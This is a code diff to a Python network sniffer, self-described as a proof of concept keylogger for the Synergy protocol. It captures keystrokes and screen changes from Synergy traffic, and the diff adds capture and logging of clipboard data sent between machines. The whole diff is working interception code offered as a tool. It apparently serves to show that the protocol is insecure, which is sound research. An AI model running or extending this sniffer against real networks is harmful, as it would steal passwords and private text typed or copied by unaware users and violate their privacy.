@@ -3,6 +3,7 @@ import argparse
 import sys
 import logging
 import time
+import re
 from threading import Thread
 from collections import defaultdict
 from textwrap import wrap
@@ -11,7 +12,7 @@ from colorlog import ColoredFormatter
 
 
 class Autolycus(object):
-    __slots__ = ["interface", "wrap_limit", "keystroke_wait_time", "redundant_wait_time", "capture", "log", "active_connections", "temp_keystrokes", "processing_entering", "processing_leaving"]
+    __slots__ = ["interface", "wrap_limit", "keystroke_wait_time", "redundant_wait_time", "capture", "log", "active_connections", "temp_keystrokes", "temp_clipboard", "processing_clipboard", "processing_entering", "processing_leaving"]
 
     # packet type constants
     PACKET = {
@@ -83,7 +84,8 @@ class Autolycus(object):
         self.log = self.setup_logger()
         self.active_connections = set()
         self.temp_keystrokes = defaultdict(list)
-        self.processing_entering = self.processing_leaving = False
+        self.temp_clipboard = ""
+        self.processing_clipboard = self.processing_entering = self.processing_leaving = False
 
     def start(self):
         self.print_banner()
@@ -125,14 +127,13 @@ class Autolycus(object):
                 elif packet_type == self.PACKET["KEYSTROKE_UP"]:
                     pass
                 elif packet_type == self.PACKET["CLIPBOARD"]:
-                    print(packet.synergy)
+                    self.handle_clipboard(packet)
                 elif packet_type == self.PACKET["CLIPBOARD_DATA"]:
-                    print(packet.synergy)
-                    print(packet.synergy.clipboarddata_data.binary_value)
+                    self.handle_clipboard_data(packet)
                 elif packet_type == self.PACKET["ENTERING_SCREEN"]:
-                    self.entering_screen(packet)
+                    self.handle_entering_screen(packet)
                 elif packet_type == self.PACKET["LEAVING_SCREEN"]:
-                    self.leaving_screen(packet)
+                    self.handle_leaving_screen(packet)
                 elif len(packet.synergy.field_names) > 0:
                     packet.synergy.pretty_print()
                     print(packet.synergy.field_names)
@@ -182,7 +183,27 @@ class Autolycus(object):
         [self.log.log(self.DATA, f"\t{batch}") for batch in wrap(''.join(self.temp_keystrokes[hash(src + dst) & ((1 << 32) - 1)]), self.wrap_limit)]
         self.temp_keystrokes[hash(src + dst) & ((1 << 32) - 1)].clear()
 
-    def entering_screen(self, packet):
+    def handle_clipboard(self, packet):
+        if not self.processing_clipboard:
+            self.processing_clipboard = True
+            Thread(target=self.clipboard_listener, args=(packet,)).start()
+
+    def clipboard_listener(self, packet):
+        time.sleep(self.redundant_wait_time)
+        self.processing_leaving = False
+        self.log.log(self.INFO, f"({packet.ip.src} -> {packet.ip.dst}) grabbing clipboard")
+
+    def handle_clipboard_data(self, packet):
+        try:
+            # TODO: avoid duplicates and fix ghost strings
+            clipboard = re.sub(r'[^\x00-\x7f]',r'', packet.synergy.clipboarddata_data.binary_value.decode())
+            if len(clipboard) > 3 and not clipboard[:3].isnumeric() and clipboard != self.temp_clipboard:
+                self.temp_clipboard = clipboard
+                self.log.log(self.INFO, f"{packet.ip.src} -> {packet.ip.dst} transferring clipboard data:")
+                self.log.log(self.DATA, f"\t{clipboard}")
+        except: pass
+
+    def handle_entering_screen(self, packet):
         if not self.processing_entering:
             self.processing_entering = True
             Thread(target=self.entering_listener, args=(packet,)).start()
@@ -194,7 +215,7 @@ class Autolycus(object):
         self.log.log(self.DATA, f"\tScreen X: {packet.synergy.cinn_x}")
         self.log.log(self.DATA, f"\tScreen Y: {packet.synergy.cinn_y}")
 
-    def leaving_screen(self, packet):
+    def handle_leaving_screen(self, packet):
         if not self.processing_leaving:
             self.processing_leaving = True
             Thread(target=self.leaving_listener, args=(packet,)).start()
@@ -240,11 +261,11 @@ class Autolycus(object):
 
 
 def main():
-    parser = argparse.ArgumentParser()
+    parser = argparse.ArgumentParser(description="A proof of concept keylogger for the Synergy protocol.")
     parser.add_argument("interface", help="The interface to listen on.", type=str)
-    parser.add_argument("--wrap_limit", help="The max amount of characters to print on a single line when dumping keystrokes/clipboard data.", type=int, default=200)
-    parser.add_argument("--keystroke_wait_time", help="The time in seconds to wait without hearing new keystrokes before printing the dump.", type=int, default=5)
-    parser.add_argument("--redundant_wait_time", help="The time in seconds to wait before printing actions which commonly contain duplicates. Longer window = less duplicates.", type=int, default=1)
+    parser.add_argument("-w", "--wrap_limit", help="The max amount of characters to print on a single line when dumping keystrokes/clipboard data.", type=int, default=200)
+    parser.add_argument("-k", "--keystroke_wait_time", help="The time in seconds to wait without hearing new keystrokes before printing the dump.", type=int, default=5)
+    parser.add_argument("-r", "--redundant_wait_time", help="The time in seconds to wait before printing actions which commonly contain duplicates. Longer window = less duplicates.", type=int, default=1)
     args = parser.parse_args()
 
     autolycus = Autolycus(args.interface, args.wrap_limit, args.keystroke_wait_time, args.redundant_wait_time)
